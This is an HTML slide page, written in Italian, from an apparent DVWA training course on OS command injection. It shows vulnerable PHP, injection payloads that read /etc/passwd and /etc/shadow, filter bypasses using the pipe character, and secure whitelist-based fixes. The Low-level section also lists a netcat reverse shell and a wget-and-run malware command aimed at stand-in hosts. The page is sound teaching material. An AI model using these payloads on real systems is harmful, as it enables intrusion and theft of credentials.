@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="it">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>02 - Command Injection | DVWA Cybersecurity Course</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+    <div class="slide-container">
+
+        <!-- Introduction -->
+        <section class="section">
+            <h1>💉 Command Injection</h1>
+            <p class="hero-subtitle">
+                Esecuzione di comandi arbitrari sul sistema operativo tramite vulnerabilità di applicazioni web
+            </p>
+        </section>
+
+        <!-- Theory Section -->
+        <section class="section">
+            <h2 class="section-title">📖 Cos'è la Command Injection?</h2>
+
+            <div class="card">
+                <h3>Definizione</h3>
+                <p>
+                    La <strong>Command Injection</strong> (o OS Command Injection) è una vulnerabilità
+                    che si verifica quando un'applicazione web esegue comandi del sistema operativo
+                    basandosi su input forniti dall'utente senza adeguata validazione o sanificazione.
+                </p>
+                <p>
+                    Un attaccante può sfruttare questa vulnerabilità per eseguire comandi arbitrari
+                    sul server, ottenendo accesso non autorizzato, rubando dati, installando malware
+                    o compromettendo completamente il sistema.
+                </p>
+            </div>
+
+            <div class="card">
+                <h3>Come Funziona?</h3>
+                <p>
+                    Le applicazioni web spesso devono eseguire comandi di sistema per funzioni
+                    specifiche (es. ping, traceroute, conversione file). Se l'input dell'utente
+                    viene concatenato direttamente nel comando senza validazione, l'attaccante
+                    può iniettare comandi aggiuntivi.
+                </p>
+
+                <h4>Esempio Vulnerabile:</h4>
+                <pre><code>// PHP vulnerabile
+$target = $_GET['ip'];
+$output = shell_exec("ping -c 4 " . $target);</code></pre>
+
+                <h4>Input Malevolo:</h4>
+                <pre><code>127.0.0.1; cat /etc/passwd</code></pre>
+
+                <h4>Comando Eseguito:</h4>
+                <pre><code>ping -c 4 127.0.0.1; cat /etc/passwd</code></pre>
+            </div>
+
+            <div class="card">
+                <h3>Metacaratteri di Concatenazione dei Comandi</h3>
+                <p>I metacaratteri shell permettono di concatenare più comandi:</p>
+                <ul>
+                    <li><code>;</code> - Esegue il comando successivo indipendentemente dal risultato del precedente
+                    </li>
+                    <li><code>&&</code> - Esegue il comando successivo solo se il precedente ha successo</li>
+                    <li><code>||</code> - Esegue il comando successivo solo se il precedente fallisce</li>
+                    <li><code>|</code> - Pipe: passa l'output del primo comando come input del secondo</li>
+                    <li><code>`comando`</code> - Command substitution (backticks)</li>
+                    <li><code>$(comando)</code> - Command substitution (sintassi moderna)</li>
+                    <li><code>&</code> - Esegue il comando in background</li>
+                    <li><code>\n</code> - Newline (può separare comandi)</li>
+                </ul>
+            </div>
+        </section>
+
+        <!-- Low Security Level -->
+        <section class="level-section">
+            <h3><span class="badge badge-low">Low Security</span> Vulnerabilità e Sfruttamento</h3>
+
+            <div class="alert alert-danger">
+                <strong>⚠️ Vulnerabilità:</strong> Il codice prende l'input dell'utente e lo passa
+                direttamente alla funzione <code>shell_exec()</code> senza alcuna validazione o sanificazione.
+            </div>
+
+            <div class="card">
+                <h4>Codice Vulnerabile (Concettuale):</h4>
+                <pre><code>$target = $_REQUEST['ip'];
+$cmd = shell_exec('ping -c 4 ' . $target);
+echo $cmd;</code></pre>
+            </div>
+
+            <h4>🎯 Metodo 1: Usando il Punto e Virgola (;)</h4>
+            <div class="card">
+                <p>Il punto e virgola permette di eseguire comandi sequenziali:</p>
+
+                <h4>Payload:</h4>
+                <pre><code>127.0.0.1 ; cat /etc/passwd</code></pre>
+
+                <div class="spoiler">
+                    <div class="spoiler-content">
+                        <h4>💡 Risultato:</h4>
+                        <p>
+                            Vengono eseguiti entrambi i comandi:
+                            <br>1. <code>ping -c 4 127.0.0.1</code> (esegue il ping)
+                            <br>2. <code>cat /etc/passwd</code> (visualizza il file delle password)
+                        </p>
+                        <p>
+                            L'output mostrerà sia i risultati del ping che il contenuto del file /etc/passwd,
+                            che contiene informazioni sugli account utente del sistema.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <h4>🎯 Metodo 2: Usando l'Operatore AND (&&)</h4>
+            <div class="card">
+                <p>L'operatore AND esegue il secondo comando solo se il primo ha successo:</p>
+
+                <h4>Payload:</h4>
+                <pre><code>127.0.0.1 && cat /etc/passwd</code></pre>
+
+                <div class="spoiler">
+                    <div class="spoiler-content">
+                        <h4>💡 Differenza con il Punto e Virgola:</h4>
+                        <p>
+                            Con <code>&&</code>, il secondo comando viene eseguito SOLO se il primo
+                            ha successo (exit code 0). Questo è utile per creare payload condizionali.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <h4>🎯 Altri Comandi Pericolosi</h4>
+            <div class="card">
+                <pre><code># Elencare file nella directory corrente
+127.0.0.1 ; ls -la
+
+# Visualizzare il contenuto di file sensibili
+127.0.0.1 ; cat /etc/shadow
+
+# Scoprire l'utente corrente
+127.0.0.1 ; whoami
+
+# Ottenere informazioni di sistema
+127.0.0.1 ; uname -a
+
+# Creare una reverse shell
+127.0.0.1 ; nc -e /bin/bash attacker_ip 4444
+
+# Scaricare ed eseguire malware
+127.0.0.1 ; wget http://evil.com/malware.sh -O /tmp/m.sh && bash /tmp/m.sh</code></pre>
+            </div>
+        </section>
+
+        <!-- Medium Security Level -->
+        <section class="level-section">
+            <h3><span class="badge badge-medium">Medium Security</span> Protezioni Implementate</h3>
+
+            <div class="alert alert-warning">
+                <strong>🛡️ Nuove Difese:</strong> È stata aggiunta la funzione <code>str_replace()</code>
+                che sostituisce i metacaratteri <code>&&</code> e <code>;</code> con spazi vuoti.
+            </div>
+
+            <div class="card">
+                <h4>Codice di Protezione (Concettuale):</h4>
+                <pre><code>$target = $_REQUEST['ip'];
+$target = str_replace("&&", "", $target);
+$target = str_replace(";", "", $target);
+$cmd = shell_exec('ping -c 4 ' . $target);</code></pre>
+            </div>
+
+            <h4>🎯 Bypass: Usando il Pipe (|)</h4>
+            <div class="card">
+                <p>
+                    La blacklist non include il carattere pipe <code>|</code>, che possiamo
+                    sfruttare per bypassare la protezione.
+                </p>
+
+                <h4>Payload:</h4>
+                <pre><code>127.0.0.1 | cat /etc/passwd</code></pre>
+
+                <div class="spoiler">
+                    <div class="spoiler-content">
+                        <h4>💡 Spiegazione:</h4>
+                        <p>
+                            Il pipe <code>|</code> passa l'output del comando ping come input al
+                            comando <code>cat /etc/passwd</code>. Anche se il comportamento è
+                            leggermente diverso, otteniamo comunque l'esecuzione del comando desiderato.
+                        </p>
+                        <p>
+                            <strong>Lezione:</strong> Le blacklist sono inefficaci perché è impossibile
+                            elencare tutti i possibili metacaratteri e encoding. Serve una whitelist!
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- High Security Level -->
+        <section class="level-section">
+            <h3><span class="badge badge-high">High Security</span> Protezioni Avanzate</h3>
+
+            <div class="alert alert-info">
+                <strong>🛡️ Difese Aggiunte:</strong> La blacklist è stata estesa per includere
+                più metacaratteri: <code>&</code>, <code>;</code>, e <code>|</code> (con spazio dopo).
+            </div>
+
+            <div class="card">
+                <h4>Codice di Protezione (Concettuale):</h4>
+                <pre><code>$target = $_REQUEST['ip'];
+$target = str_replace("& ", "", $target);
+$target = str_replace("; ", "", $target);
+$target = str_replace("| ", "", $target);
+$cmd = shell_exec('ping -c 4 ' . $target);</code></pre>
+            </div>
+
+            <h4>🎯 Bypass: Pipe Senza Spazio</h4>
+            <div class="card">
+                <p>
+                    La funzione <code>str_replace()</code> cerca il pattern con lo spazio dopo
+                    il pipe. Possiamo bypassarla rimuovendo lo spazio.
+                </p>
+
+                <h4>Payload:</h4>
+                <pre><code>127.0.0.1 |cat /etc/passwd</code></pre>
+
+                <div class="spoiler">
+                    <div class="spoiler-content">
+                        <h4>💡 Spiegazione:</h4>
+                        <p>
+                            Senza lo spazio dopo il pipe, il pattern <code>"| "</code> non viene trovato
+                            dalla <code>str_replace()</code>, quindi il payload passa indenne.
+                        </p>
+                        <p>
+                            La shell interpreta correttamente <code>|cat</code> come pipe seguito dal
+                            comando cat, quindi l'attacco funziona perfettamente.
+                        </p>
+                        <p>
+                            <strong>Lezione:</strong> Anche le blacklist più complete hanno falle.
+                            È fondamentale validare positivamente l'input (whitelist).
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Impossible Security Level -->
+        <section class="level-section">
+            <h3><span class="badge badge-impossible">Impossible</span> Implementazione Sicura</h3>
+
+            <div class="alert alert-success">
+                <strong>✅ Difesa Corretta:</strong> L'indirizzo IP viene validato rigorosamente
+                usando una whitelist. Viene suddiviso in 4 segmenti numerici e riassemblato.
+            </div>
+
+            <div class="card">
+                <h4>Approccio Sicuro (Concettuale):</h4>
+                <pre><code>$target = $_REQUEST['ip'];
+
+// Suddivide l'IP in 4 parti
+$octet = explode(".", $target);
+
+// Valida che ci siano esattamente 4 segmenti
+if (count($octet) == 4) {
+    // Valida che ogni segmento sia un numero tra 0 e 255
+    for ($i = 0; $i < 4; $i++) {
+        if (!is_numeric($octet[$i]) || $octet[$i] < 0 || $octet[$i] > 255) {
+            exit("Invalid IP");
+        }
+    }
+    // Riassembla l'IP validato
+    $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];
+    $cmd = shell_exec('ping -c 4 ' . $target);
+} else {
+    exit("Invalid IP format");
+}</code></pre>
+
+                <div class="spoiler">
+                    <div class="spoiler-content">
+                        <h4>💡 Perché Funziona:</h4>
+                        <ul>
+                            <li>✅ Valida il formato esatto dell'IP (4 ottetti separati da punti)</li>
+                            <li>✅ Verifica che ogni ottetto sia numerico e nel range 0-255</li>
+                            <li>✅ Ricostruisce l'IP da componenti validati (nessun carattere extra)</li>
+                            <li>✅ Qualsiasi metacarattere viene rifiutato nella fase di validazione</li>
+                        </ul>
+                        <p>
+                            <strong>Importante:</strong> Questo è un esempio di <strong>input validation</strong>
+                            corretta usando una whitelist invece di una blacklist.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Mitigation Strategies -->
+        <section class="mitigation-box">
+            <h2>🛡️ Strategie di Mitigazione</h2>
+
+            <div class="card">
+                <h3>1. Input Validation con Whitelist</h3>
+                <ul>
+                    <li><strong>Validare formato</strong>: Usare regex o funzioni specifiche per validare il formato
+                        atteso</li>
+                    <li><strong>Whitelist di caratteri</strong>: Permettere solo caratteri alfanumerici e specifici
+                        necessari</li>
+                    <li><strong>Range checking</strong>: Verificare che i valori numerici siano nel range valido</li>
+                    <li><strong>Rifiutare invece di sanificare</strong>: Se l'input non è valido, rifiutarlo
+                        completamente</li>
+                </ul>
+            </div>
+
+            <div class="card">
+                <h3>2. Evitare l'Esecuzione Diretta di Comandi</h3>
+                <ul>
+                    <li><strong>Usare API native</strong>: Invece di <code>shell_exec("ping $ip")</code>, usare librerie
+                        native</li>
+                    <li><strong>Funzioni specifiche</strong>: Preferire funzioni built-in del linguaggio</li>
+                    <li><strong>Parametrizzazione</strong>: Se devi eseguire comandi, usa interfacce parametrizzate</li>
+                </ul>
+
+                <h4>Esempio Sicuro (PHP):</h4>
+                <pre><code>// Invece di shell_exec con input utente
+// Usa escapeshellarg() o escapeshellcmd()
+$target = escapeshellarg($_REQUEST['ip']);
+$cmd = shell_exec("ping -c 4 " . $target);</code></pre>
+            </div>
+
+            <div class="card">
+                <h3>3. Principle of Least Privilege</h3>
+                <ul>
+                    <li><strong>User con privilegi minimi</strong>: Eseguire il server web con un utente non
+                        privilegiato</li>
+                    <li><strong>Chroot jail</strong>: Isolare l'ambiente di esecuzione</li>
+                    <li><strong>Containers</strong>: Usare Docker o altre tecnologie di containerizzazione</li>
+                    <li><strong>SELinux/AppArmor</strong>: Applicare policy di sicurezza a livello OS</li>
+                </ul>
+            </div>
+
+            <div class="card">
+                <h3>4. Funzioni di Escaping</h3>
+                <p>Se DEVI eseguire comandi di sistema, usa funzioni di escaping:</p>
+                <ul>
+                    <li><strong>PHP</strong>: <code>escapeshellarg()</code>, <code>escapeshellcmd()</code></li>
+                    <li><strong>Python</strong>: Usare <code>subprocess</code> con array di argomenti</li>
+                    <li><strong>Node.js</strong>: <code>child_process.execFile()</code> invece di <code>exec()</code>
+                    </li>
+                    <li><strong>Java</strong>: <code>ProcessBuilder</code> con array di argomenti</li>
+                </ul>
+
+                <h4>Esempio Python Sicuro:</h4>
+                <pre><code># INSICURO
+os.system("ping -c 4 " + user_input)
+
+# SICURO
+import subprocess
+subprocess.run(["ping", "-c", "4", user_input])</code></pre>
+            </div>
+
+            <div class="card">
+                <h3>5. Monitoring e Detection</h3>
+                <ul>
+                    <li><strong>Logging</strong>: Loggare tutti i comandi eseguiti dal web server</li>
+                    <li><strong>IDS/IPS</strong>: Implementare sistemi di rilevamento/prevenzione intrusioni</li>
+                    <li><strong>WAF</strong>: Web Application Firewall con regole per command injection</li>
+                    <li><strong>Anomaly Detection</strong>: Rilevare pattern anomali di esecuzione comandi</li>
+                </ul>
+            </div>
+
+            <div class="card">
+                <h3>6. Architettura Sicura</h3>
+                <ul>
+                    <li><strong>Separazione dei livelli</strong>: Non eseguire comandi OS dal livello web</li>
+                    <li><strong>API Gateway</strong>: Centralizzare e validare tutte le richieste</li>
+                    <li><strong>Microservizi isolati</strong>: Limitare il blast radius di una compromissione</li>
+                    <li><strong>Immutable infrastructure</strong>: Rendere difficile la persistenza di malware</li>
+                </ul>
+            </div>
+        </section>
+
+        <!-- Summary -->
+        <section class="section">
+            <div class="alert alert-success">
+                <h3>📌 Riepilogo</h3>
+                <p>
+                    La Command Injection è una delle vulnerabilità più critiche perché permette
+                    l'esecuzione arbitraria di codice sul server. Le blacklist sono inefficaci;
+                    la difesa richiede validation rigorosa con whitelist, preferenza per API native,
+                    e architetture che minimizzano l'esecuzione di comandi OS.
+                </p>
+                <p>
+                    <strong>Regola d'oro:</strong> Mai fidarsi dell'input utente. Sempre validare,
+                    sempre sanificare, e quando possibile, evitare completamente l'esecuzione di
+                    comandi di sistema.
+                </p>
+            </div>
+        </section>
+
+    </div>
+
+    <!-- Navigation -->
+    <div class="nav-container">
+        <button class="nav-btn" id="nav-home" onclick="window.location.href='index.html'">🏠 Home</button>
+        <button class="nav-btn" id="nav-prev" onclick="window.location.href='01_brute_force.html'">← Precedente</button>
+        <span class="nav-info" id="progress">3 / 8</span>
+        <button class="nav-btn" id="nav-next" onclick="window.location.href='03_csrf.html'">Successivo →</button>
+    </div>
+
+    <script src="navigation.js"></script>
+</body>
+
+</html>
